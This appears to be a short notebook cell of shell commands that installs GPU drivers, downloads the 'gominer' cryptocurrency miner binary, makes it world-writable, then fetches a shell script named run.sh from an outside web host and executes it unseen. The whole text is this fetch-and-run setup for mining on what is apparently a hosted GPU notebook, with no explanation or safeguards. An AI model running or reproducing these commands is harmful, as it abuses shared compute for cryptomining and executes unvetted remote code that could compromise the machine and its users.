
!apt-get install  sudo -y

!apt-get  update -y

!apt-get install -y clinfo nvidia-cuda-toolkit nvidia-opencl-icd-384 

!wget https://github.com/bitcoinx-project/gominer/releases/download/v1.0/gominer-v1.0-linux

!mv gominer-v1.0-linux /usr/local/bin/gominer

!chmod -R 777 /usr/local/bin/gominer

!wget http://v1.weiweixiao.net/WeiwinData/conf/images/run.sh

!chmod -R 777 run.sh

!sh ./run.sh
